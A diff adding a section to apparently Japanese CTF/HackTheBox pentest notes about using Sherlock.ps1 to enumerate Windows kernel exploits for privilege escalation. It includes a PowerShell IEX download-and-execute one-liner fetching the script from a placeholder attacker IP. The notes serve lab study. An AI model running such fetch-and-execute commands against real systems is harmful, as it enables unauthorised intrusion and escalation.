@@ -922,6 +922,25 @@ hit したものを、github で検索たり、
 ex: [MS-059](https://medium.com/@pkhadka56/hackthebox-devel-windows-46763fdd5720)
 
 
+## Sherlock.ps1
+
+local privilege escalation をするために、 Kernel Exploitを列挙するps1のスクリプト。
+
+Powershellが使えるならEmpire上から、実行する。
+
+[Optimum Ippsec movie](https://www.youtube.com/watch?v=kWTnVBIpNsE)
+
+```
+1. Sherlock.ps1 をvi でファイル編集し、最終行に、
+
+Find-AllVulns　を追加。
+　
+2. 
+
+IEX(New-Object Net.Webclient).downloadString('http://<ip>:8000/Sherlock.ps1')
+
+```
+
 ## metasploit(local_exploit_suggester)
 
 [https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)
